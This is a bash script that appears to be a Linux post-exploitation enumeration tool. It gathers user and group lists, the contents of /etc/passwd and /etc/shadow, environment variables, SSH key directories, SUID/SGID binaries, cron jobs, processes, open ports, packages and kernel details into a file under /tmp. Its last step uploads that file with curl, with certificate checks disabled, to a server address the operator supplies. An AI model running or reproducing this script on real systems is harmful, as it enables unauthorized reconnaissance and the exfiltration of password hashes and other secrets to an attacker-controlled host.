#!/bin/bash

# Check if the server IP is provided as an argument
if [ $# -ne 1 ]; then
  echo "Usage: $0 SERVER_IP"
  exit 1
fi

# Get the server IP from the argument
server_ip="$1"
# File to check and backup if exists
file="/tmp/gx-lx-enum.out"

# Check if the file exists and rename with date suffix if it does
if [ -f "$file" ]; then
  current_date=$(date +%F)
  mv "$file" "${file%.out}-$current_date.out"
  echo "Existing file renamed to ${file%.out}-$current_date.out"
fi

# Function to print the output in block format and append to file
print_output() {
  local title=$1
  local command=$2
  local output=$3
  local exit_code=$4
  local error_message=$5
  # Green color for the output title
  echo -e "\e[32m===============Output of $title=============\e[0m" >> "$file"
  # Blue color for "Command:" and normal for $command
  echo -ne "\e[34m\e[4mCommand:\e[0m " >> "$file"
  # append the command separate to avoid interpretation
  echo "$command" >> "$file"
  echo "" >> "$file"  # Empty line after the command
  
  # Check if there's an error message
  if [[ $exit_code -ne 0 ]]; then
    # Red color for the error message
    echo -en "\e[31mError (exit code $exit_code): \e[0m" >> "$file"
    echo "" >> "$file"
  fi
  
  echo "$output" >> "$file"
  echo "" >> "$file"
}

# Run the commands and capture the output

# Privileges section
privileges_commands_1="id"
privileges_1=$(id 2>/dev/null)
print_output "User ID" "$privileges_commands_1" "$privileges_1" "$?" ""

#do this manually for now until I find a good logic
#privileges_commands_2="sudo -l"
#privileges_2=$(sudo -l 2>&1)
#print_output "Sudo Privileges" "$privileges_commands_2" "$privileges_2" "$?" "$privileges_2"

privileges_commands_3="cat /etc/passwd"
privileges_3=$(cat /etc/passwd 2>&1)
print_output "Contents of /etc/passwd" "$privileges_commands_3" "$privileges_3" "$?" "$privileges_3"

privileges_commands_4="cat /etc/shadow"
privileges_4=$(cat /etc/shadow 2>&1)
print_output "Contents of /etc/shadow" "$privileges_commands_4" "$privileges_4" "$?" "$privileges_4"

# Normal users section
normal_users_command="awk -F: '\$3 >= 1000 && \$3 < 60000 {print \$1}' /etc/passwd"
normal_users=$(awk -F: '$3 >= 1000 && $3 < 60000 {print $1}' /etc/passwd 2>&1)
print_output "Normal Users" "$normal_users_command" "$normal_users" "$?" "$normal_users"

# Users with groups section
users_with_groups_command="awk -F: '\$3 >= 1000 && \$3 < 60000 {print \$1}' /etc/passwd | while read user; do echo \"\$user: \$(id -nG \$user)\"; done"
users_with_groups=$(awk -F: '$3 >= 1000 && $3 < 60000 {print $1}' /etc/passwd | while read user; do echo "$user: $(id -nG $user)"; done 2>&1)
print_output "Users with Groups" "$users_with_groups_command" "$users_with_groups" "$?" "$users_with_groups"

# System users section
system_users_command="awk -F: '\$3 < 1000 {print \$1}' /etc/passwd"
system_users=$(awk -F: '$3 < 1000 {printf "%-20s", $1; if (NR % 3 == 0) printf "\n"; }' /etc/passwd 2>&1) # 3 columns with tab separation
print_output "System Users" "$system_users_command" "$system_users" "$?" "$system_users"

# Custom groups section
custom_groups_command="awk -F: '\$3 >= 1000 {print \$1}' /etc/group"
custom_groups=$(awk -F: '$3 >= 1000 {print $1}' /etc/group 2>&1)
print_output "Custom Groups" "$custom_groups_command" "$custom_groups" "$?" "$custom_groups"

# Sudo members section
sudo_members_command="getent group sudo"
sudo_members=$(getent group sudo 2>&1)
print_output "Sudo Members" "$sudo_members_command" "$sudo_members" "$?" "$sudo_members"

# Environment variables
env_command="env"
env_output=$(env 2>&1)
print_output "Environment Variables" "$env_command" "$env_output" "$?" "$env_output"

# Mounted file systems
mount_command="mount"
mount_output=$(mount 2>&1)
print_output "Mounted File Systems" "$mount_command" "$mount_output" "$?" "$mount_output"

# Block devices
lsblk_command="lsblk"
lsblk_output=$(lsblk 2>&1)
print_output "Block Devices" "$lsblk_command" "$lsblk_output" "$?" "$lsblk_output"

# Fstab contents
fstab_command="cat /etc/fstab"
fstab_output=$(cat /etc/fstab 2>&1)
print_output "Contents of /etc/fstab" "$fstab_command" "$fstab_output" "$?" "$fstab_output"

# Current users logged in
w_command="w"
w_output=$(w 2>&1)
print_output "Current Users Logged In" "$w_command" "$w_output" "$?" "$w_output"

# Last login information
lastlog_command="lastlog"
lastlog_output=$(lastlog 2>&1)
print_output "Last Login Information" "$lastlog_command" "$lastlog_output" "$?" "$lastlog_output"

# Route information
route_command="route"
route_output=$(route 2>&1)
print_output "Routing Information" "$route_command" "$route_output" "$?" "$route_output"

# DNS resolver configuration
resolv_conf_command="cat /etc/resolv.conf"
resolv_conf_output=$(cat /etc/resolv.conf 2>&1)
print_output "DNS Resolver Configuration" "$resolv_conf_command" "$resolv_conf_output" "$?" "$resolv_conf_output"

# ARP cache
arp_command="arp -a"
arp_output=$(arp -a 2>&1)
print_output "ARP Cache" "$arp_command" "$arp_output" "$?" "$arp_output"

# SSH keys in home directories
ssh_command="ls /home/*/.ssh"
ssh_output=$(ls /home/*/.ssh 2>&1)
print_output "SSH Keys in Home Directories" "$ssh_command" "$ssh_output" "$?" "$ssh_output"

# Bash configuration files
bash_command="ls -l /home/*/.bash*"
bash_output=$(ls -l /home/*/.bash* 2>&1)
print_output "Bash Configuration Files" "$bash_command" "$bash_output" "$?" "$bash_output"

# Print jobs
lpstat_command="lpstat"
lpstat_output=$(lpstat 2>&1)
print_output "Print Jobs" "$lpstat_command" "$lpstat_output" "$?" "$lpstat_output"

# Mail directory contents
mail_command="ls -l /var/mail"
mail_output=$(ls -l /var/mail 2>&1)
print_output "Mail Directory Contents" "$mail_command" "$mail_output" "$?" "$mail_output"

# Spool mail directory contents
spool_mail_command="ls -l /var/spool/mail"
spool_mail_output=$(ls -l /var/spool/mail 2>&1)
print_output "Spool Mail Directory Contents" "$spool_mail_command" "$spool_mail_output" "$?" "$spool_mail_output"

# Look for SUIDs and GUIDs
suid_command="find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null"
suid_output=$(find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null)
print_output "SUID Files" "$suid_command" "$suid_output" "$?" ""

guid_command="find / -perm -6000 -exec ls -ldb {} \; 2>/dev/null"
guid_output=$(find / -perm -6000 -exec ls -ldb {} \; 2>/dev/null)
print_output "GUID Files" "$guid_command" "$guid_output" "$?" ""

# Hidden files with SUIDs and GUIDs
hidden_suid_command="find / -name \".*\" -perm -4000 -exec ls -ldb {} \; 2>/dev/null"
hidden_suid_output=$(find / -name ".*" -perm -4000 -exec ls -ldb {} \; 2>/dev/null)
print_output "Hidden SUID Files" "$hidden_suid_command" "$hidden_suid_output" "$?" ""

hidden_guid_command="find / -name \".*\" -perm -6000 -exec ls -ldb {} \; 2>/dev/null"
hidden_guid_output=$(find / -name ".*" -perm -6000 -exec ls -ldb {} \; 2>/dev/null)
print_output "Hidden GUID Files" "$hidden_guid_command" "$hidden_guid_output" "$?" ""

# Check cron jobs
cron_command="ls -la /etc/cron.*"
cron_output=$(ls -la /etc/cron.* 2>/dev/null)
print_output "Cron Jobs" "$cron_command" "$cron_output" "$?" "$cron_output"

# User cron jobs
user_cron_command="ls /var/spool/cron"
user_cron_output=$(ls /var/spool/cron 2>/dev/null)
print_output "User Cron Jobs" "$user_cron_command" "$user_cron_output" "$?" "$user_cron_output"

# Processes and commands
process_command="find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr \" \" \"\\n\""
process_output=$(find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n")
print_output "Processes and Commands" "$process_command" "$process_output" "$?" "$process_output"

# Processes running by root
root_process_command="ps aux"
root_process_output=$(ps aux 2>&1)
print_output "Processes Running by Root" "$root_process_command" "$root_process_output" "$?" "$root_process_output"

# Listening ports
listening_ports_command="ss -ntulp | grep LIST"
listening_ports_output=$(ss -ntulp | grep LIST 2>&1)
print_output "Listening Ports" "$listening_ports_command" "$listening_ports_output" "$?" "$listening_ports_output"

# Installed packages by package manager
installed_pkgs_command="apt list --installed | tr \"/\" \" \" | cut -d\" \" -f1,3 | sed 's/[0-9]://g' | column -t"
installed_pkgs_output=$(apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | column -t)
print_output "Installed Packages by Package Manager" "$installed_pkgs_command" "$installed_pkgs_output" "$?" "$installed_pkgs_output"

###Commented out for further investigation as it outputs too much
## Manual installs (compiled)
#manual_installs_command="ls -l /bin /usr/bin/ /usr/sbin/ | tee -a installed_pkgs.list"
#manual_installs_output=$(ls -l /bin /usr/bin/ /usr/sbin/ | tee -a installed_pkgs.list)
#print_output "Manual Installs (Compiled)" "$manual_installs_command" "$manual_installs_output" "$?" "$manual_installs_output"

# System information
uname_command="uname -a"
uname_output=$(uname -a 2>&1)
print_output "System Information" "$uname_command" "$uname_output" "$?" "$uname_output"

version_command="cat /proc/version"
version_output=$(cat /proc/version 2>&1)
print_output "Kernel Version Information" "$version_command" "$version_output" "$?" "$version_output"

#send to the server
curl -X POST "https://$server_ip/upload" -F "files=@$file" --insecure
#report to the screen
echo "Output written to $file and sent to https://$server_ip/upload"
